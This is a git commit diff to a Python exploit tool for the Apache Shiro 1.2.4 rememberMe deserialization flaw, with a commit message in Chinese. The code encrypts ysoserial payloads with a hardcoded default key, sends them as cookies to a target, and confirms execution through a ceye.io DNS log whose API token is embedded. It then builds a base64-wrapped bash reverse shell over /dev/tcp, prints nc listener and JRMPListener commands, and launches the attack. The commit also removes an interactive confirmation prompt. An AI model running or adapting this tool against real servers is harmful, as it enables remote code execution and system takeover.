5047f5c600a24f7c833605bd0384933ec13d9d40
P1Kaju <1340914307@qq.com>
2020-05-24 00:24:18 +0800

    修正Shiro 逻辑

--- Shiro/Shiro_rememberMe.py
+++ Shiro/Shiro_rememberMe.py
@@ -9,8 +9,8 @@ import base64
 import subprocess
 import requests
 import random
+import time
 from Crypto.Cipher import AES
-import requests
 from optparse import OptionParser, OptionGroup
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
@@ -23,7 +23,7 @@ class Shiro_RememberMe(object):
         If  not using proxy, please change to None
         : proxies = None
         """
-        self.proxy = None #{'http':"127.0.0.1:1081","https":"127.0.0.1:1081"}
+        self.proxy = {} #{'http':"127.0.0.1:1081","https":"127.0.0.1:1081"}
         self.parseArguments()
         self._EXP_class = ["JRMPClient",'CommonsCollections5']
 
@@ -32,17 +32,12 @@ class Shiro_RememberMe(object):
             exit(0)
         check,key = self.audit()
         if check != False:
-            raw = input('Launch attack (Y/N): ').lower()
-            if raw not in ['n','y']:
-                raw = input('Launch attack (Y/N): ').lower()
-            if 'n' in raw:
-                exit(0)
-            if not self.ip:
-                local = requests.get('https://ifconfig.me/all.json',proxies=self.proxy,timeout=8,verify=False).text
-                json_ = json.loads(local).get('ip_addr')
-                self.ip = json_
-
-            self.attck(key)
+            if self.reverse_Shell != False:
+                if not self.ip:
+                    print("Confirm your server ip!")
+                    exit(0)
+                key = "kPH+bIxk5D2deZiIxcaaaA=="
+                self.attck(key)
 
     def encode_rememberme(self,_EXP_class,key,command):
         BLOCK_SIZE = AES.block_size
@@ -71,15 +66,18 @@ class Shiro_RememberMe(object):
                 print("[*] Using Key: {}".format(key))
                 base64_ciphertext = self.encode_rememberme(self._EXP_class[0],key,command)
                 print("[*] base64_decodeTXT: rememberMe={}".format(base64_ciphertext.decode()))
-                response = requests.post(self.url, timeout=20, verify=False,proxies=self.proxy,cookies={"rememberMe": base64_ciphertext.decode()})
-                if response.status_code == 500:
-                    raise Exception("Network error occurred in the first request")
+                try:
+                    response = requests.post(self.url, timeout=1, verify=False,cookies={"rememberMe": base64_ciphertext.decode()},proxies=self.proxy) # proxies=self.proxy
+                    if response.status_code == 500:
+                        raise Exception("Network error occurred in the first request")
+                except Exception as error:
+                    print(error)
                 print ('[*] Request to target URL success!\n')
                 req = requests.get('http://api.ceye.io/v1/records?token=603fd72e8621857c2b4c116fc5c1ede7&type=dns',timeout=5,proxies=self.proxy)
                 if req.status_code == 500:
                     raise Exception("Network error occurred in the second request")
                 if command in req.text:
-                    warning_info='{} 存在Shiro RememberMe 1.2.4 反序列化命令执行漏洞\r\n漏洞地址:{}\r\n漏洞详情:\n密钥：{}\r\n{}'.format(self.url,self.url,  key ,"rememberMe={}".format(base64_ciphertext.decode()))
+                    warning_info='{} 存在Shiro RememberMe 1.2.4 反序列化命令执行漏洞\r\n漏洞地址:{}\r\n漏洞详情:\n密钥：{}\r\n{}'.format(self.url,self.url,key ,"rememberMe={}".format(base64_ciphertext.decode()))
                     print(warning_info)  
                     return True,key
             return False,None
@@ -90,15 +88,15 @@ class Shiro_RememberMe(object):
             return False,None
 
     def attck(self,key):
-        print("[*] Try to use {} payload...".format(self._EXP_class[1]))
+        print("\033[01;32m[*] Try to use {} payload...\033[0m".format(self._EXP_class[1]))
         bash_reshell = 'bash -c {echo,%s}|{base64,-d}|{bash,-i}' % (base64.b64encode('bash -i >& /dev/tcp/{}/{} 0>&1'.format(self.ip,self.port).encode('utf-8')).decode('ascii'))
         command = 'java -cp ysoserial.jar ysoserial.exploit.JRMPListener {} CommonsCollections5 "{}"'.format(self.JRMPListener,bash_reshell)
-        print("[*] {}".format(self.ip+":"+self.port))
-        print("[*] Please create a command line window to enter commands: \n{}\n".format(command))
+        print("\033[01;34m[*] Please create a command line window to enter commands\033[0m: \n\033[1;31mnc -lvvp {}\033[0m\n".format(self.ip+":"+self.port))
+        print("\033[01;34m[*] Please create a command line window to enter commands\033[0m: \n\033[1;31m{}\033[0m\n".format(command))
 
-        base64_ciphertext = self.encode_rememberme(self._EXP_class[0],key,self.ip+":"+self.port) #设置监听
-        print("[*] base64_decodeTXT: \nrememberMe={}".format(base64_ciphertext.decode()))
-        response = requests.post(self.url, timeout=20, verify=False,proxies=self.proxy,cookies={"rememberMe": base64_ciphertext.decode()})
+        base64_ciphertext = self.encode_rememberme(self._EXP_class[0],key,self.ip+":"+self.JRMPListener) #设置监听
+        print("\033[01;34m[*] base64_decodeTXT\033[0m: \n\033[1;31mrememberMe={}\033[0m".format(base64_ciphertext.decode()))
+        response = requests.post(self.url, timeout=20, verify=False,cookies={"rememberMe": base64_ciphertext.decode()},proxies=self.proxy) #proxies=self.proxy
         if response.status_code == 500:
             print("Network error....")
             exit(0)
@@ -110,8 +108,10 @@ class Shiro_RememberMe(object):
         mandatory.add_option('-u', '--url', help='URL target', action='store', type='string', dest='url', default=None)
         mandatory.add_option('--ip', '--reflex_IP', help='反弹shell的IP 默认当前外网地址', action='store', dest='reflexIP', default=None)
         mandatory.add_option('--port', '--reflex_PORT', help='反弹shell的PORT 默认8888', action='store', dest='reflexPORT', default='8888')
-        mandatory.add_option('-l', '--JRMPListener', help='监听地址 默认3888', action='store', dest='JRMPListener', default=3888)
+        mandatory.add_option('-l', '--JRMPListener', help='监听地址 默认3888', action='store', dest='JRMPListener', default='3888')
         mandatory.add_option('--proxy', '--http-proxy', action='store', dest='httpProxy', type='string',default=self.proxy, help='Http Proxy (example: localhost:8080')
+        mandatory.add_option('--shell', '--reverse-Shell',  dest='shell', type='string',default=False, help='reverse-Shell [Arbitrary parameter]')
+
         parser.add_option_group(mandatory)
         options, arguments = parser.parse_args()
         self.url = options.url
@@ -119,6 +119,7 @@ class Shiro_RememberMe(object):
         self.proxy = options.httpProxy
         self.ip = options.reflexIP
         self.port = options.reflexPORT
+        self.reverse_Shell = options.shell
         return options
 
 if __name__ == "__main__":
